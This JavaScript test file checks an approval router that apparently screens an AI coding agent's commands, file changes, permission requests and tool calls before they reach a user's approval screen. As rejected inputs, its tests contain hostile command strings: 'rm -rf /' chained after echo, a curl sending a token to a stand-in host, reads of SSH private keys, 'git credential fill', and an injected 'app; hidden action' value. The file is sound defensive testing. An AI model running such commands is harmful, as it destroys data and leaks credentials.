import test from 'node:test';import assert from 'node:assert/strict';
import {deviceApproval,nativeApprovalResponse} from '../src/approvals.mjs';
const base={threadId:'t',turnId:'v',itemId:'i',startedAtMs:1,cwd:'/project'};
const app=(name,tool='get_app_state')=>({...base,serverName:'cua_repl',mode:'form',requestedSchema:{type:'object',properties:{}},_meta:{codex_approval_kind:'mcp_tool_call',tool_name:tool,tool_params:{app:name},riskLevel:'low',persist:['session','always']}});
test('Computer Use routing is native class-based, not Calculator/app-name policy',()=>{
 for(const name of ['com.apple.calculator','com.apple.screenshot.launcher','org.example.editor'])for(const tool of ['get_app_state','type_text','click','press_key']){
  const p=app(name,tool),d=deviceApproval('mcpServer/elicitation/request',p);assert.equal(d.kind,'computer-use');assert.ok(d.target.includes(name));assert.equal(d.scope,'once');
  assert.deepEqual(nativeApprovalResponse('mcpServer/elicitation/request',p,true),{action:'accept',content:{}});
 }
 assert.equal(deviceApproval('mcpServer/elicitation/request',app('app; hidden action')),null);
});
test('command approval shows the complete bounded simple command and fails closed on opaque code/stdin',()=>{
 const d=deviceApproval('item/commandExecution/requestApproval',{...base,command:'cat README.md',availableDecisions:['accept','decline']},{cwd:'/project'});assert.equal(d.kind,'command');assert.equal(d.scope,'once');assert.equal(d.target,'cat README.md');assert.equal(d.risk,'high');
 for(const p of [{command:'echo x; rm -rf /'},{command:'curl https://host.invalid/?token=secret'},{command:'python -c "hidden code"'},{kind:'writeStdin',command:'rm file'},{command:'cat README.md',availableDecisions:['acceptForSession','decline']}])assert.equal(deviceApproval('item/commandExecution/requestApproval',{...base,...p},{cwd:'/project'}),null);
});
test('patch needs matching native item and cannot grant session root',()=>{
 const item={id:'i',type:'fileChange',changes:[{path:'/project/README.md',kind:{type:'update'},diff:'-old\n+new'}]};
 const d=deviceApproval('item/fileChange/requestApproval',base,{cwd:'/project',item});assert.equal(d.kind,'file-change');assert.ok(d.target.includes('README.md'));assert.equal(d.scope,'once');
 assert.equal(deviceApproval('item/fileChange/requestApproval',base,{cwd:'/project'}),null);
 assert.equal(deviceApproval('item/fileChange/requestApproval',{...base,grantRoot:'/project'},{cwd:'/project',item}),null);
 assert.equal(deviceApproval('item/fileChange/requestApproval',base,{cwd:'/project',item:{...item,id:'foreign'}}),null);
});
test('permissions disclose actual turn scope and full bounded targets, never session',()=>{
 const p={...base,permissions:{fileSystem:{read:['/project/README.md']}}};const d=deviceApproval('item/permissions/requestApproval',p,{cwd:'/project'});assert.equal(d.kind,'permissions');assert.equal(d.scope,'turn');assert.ok(d.target.includes('README.md'));
 assert.equal(nativeApprovalResponse('item/permissions/requestApproval',p,true).scope,'turn');
 assert.equal(deviceApproval('item/permissions/requestApproval',{...base,permissions:{fileSystem:{write:['/Users/me/.ssh/key']}}},{cwd:'/project'}),null);
});
test('native empty MCP tool confirmations expose bounded primitive action/target only; no opaque payload',()=>{
 const p={...base,mode:'form',serverName:'example_mcp',requestedSchema:{type:'object',properties:{}},_meta:{codex_approval_kind:'mcp_tool_call',tool_name:'rename_record',tool_params:{record:'demo',name:'new'},riskLevel:'high'}};
 const d=deviceApproval('mcpServer/elicitation/request',p);assert.equal(d.kind,'mcp-tool');assert.ok(d.target.includes('demo'));assert.equal(d.scope,'once');
 for(const patch of [{tool_params:{token:'hidden'}},{tool_params:{code:'do anything'}},{tool_params:{payload:{data:'nested'}}},{persist:['always']},{tool_params:{text:'x'.repeat(200)}}])assert.equal(deviceApproval('mcpServer/elicitation/request',{...p,_meta:{...p._meta,...patch}}),null);
});

test('router never hides material code/targets by truncation or accepts unknown execution environment',()=>{
 assert.equal(deviceApproval('item/commandExecution/requestApproval',{...base,command:'cat /Users/me/.ssh/id_rsa'},{cwd:'/project'}),null);
 assert.equal(deviceApproval('item/commandExecution/requestApproval',{...base,command:'cat README.md',environmentId:'remote'},{cwd:'/project'}),null);
 const item={id:'i',type:'fileChange',changes:[{path:'/project/file.txt',kind:{type:'update'},diff:'+'+'x'.repeat(200)}]};
 assert.equal(deviceApproval('item/fileChange/requestApproval',base,{cwd:'/project',item}),null);
});

test('patch preview retains hunk content starting +++/--- and rejects hidden oversized changes',()=>{
 const item={id:'i',type:'fileChange',changes:[{path:'/project/a.txt',kind:{type:'update'},diff:'--- a/a.txt\n+++ b/a.txt\n@@ -1 +1 @@\n-old\n+++hidden'}]};
 const d=deviceApproval('item/fileChange/requestApproval',base,{cwd:'/project',item});assert.ok(d.target.includes('+++hidden'));assert.ok(d.target.includes('@@ -1 +1 @@'));
 item.changes[0].diff+='\n+'+'X'.repeat(100);assert.equal(deviceApproval('item/fileChange/requestApproval',base,{cwd:'/project',item}),null);
});
test('foreign user paths stay explicit and malformed native params always fail closed',()=>{
 const d=deviceApproval('item/permissions/requestApproval',{...base,permissions:{fileSystem:{read:['/Users/another-user/report.txt']}}},{cwd:'/project'});assert.ok(d.target.includes('/Users/another-user/'));assert.ok(!d.target.includes('~/'));
 for(const method of ['item/commandExecution/requestApproval','item/fileChange/requestApproval','item/permissions/requestApproval','mcpServer/elicitation/request'])for(const params of [null,undefined,1,'bad',[]])assert.equal(deviceApproval(method,params),null);
});
test('a generic MCP low-risk hint cannot suppress the second confirmation requirement',()=>{
 const p={...base,serverName:'example',mode:'form',requestedSchema:{type:'object',properties:{}},_meta:{codex_approval_kind:'mcp_tool_call',tool_name:'delete_record',tool_params:{target:'example'},riskLevel:'low'}};
 assert.equal(deviceApproval('mcpServer/elicitation/request',p).risk,'high');
});
test('credentials in simple argv and arbitrary primitive provider payloads stay off HUD',()=>{
 for(const command of ['curl -u user:pw https://example.com','custom-login user secretvalue','git credential fill','./cat README.md'])assert.equal(deviceApproval('item/commandExecution/requestApproval',{...base,command},{cwd:'/project'}),null);
 const p={...base,serverName:'example',mode:'form',requestedSchema:{type:'object',properties:{}},_meta:{codex_approval_kind:'mcp_tool_call',tool_name:'update_record',tool_params:{message:'private body'},riskLevel:'low'}};
 assert.equal(deviceApproval('mcpServer/elicitation/request',p),null);
 assert.equal(deviceApproval('mcpServer/elicitation/request',{...p,_meta:{...p._meta,tool_params:{url:'https://user:pw@example.com/a'}}}),null);
});
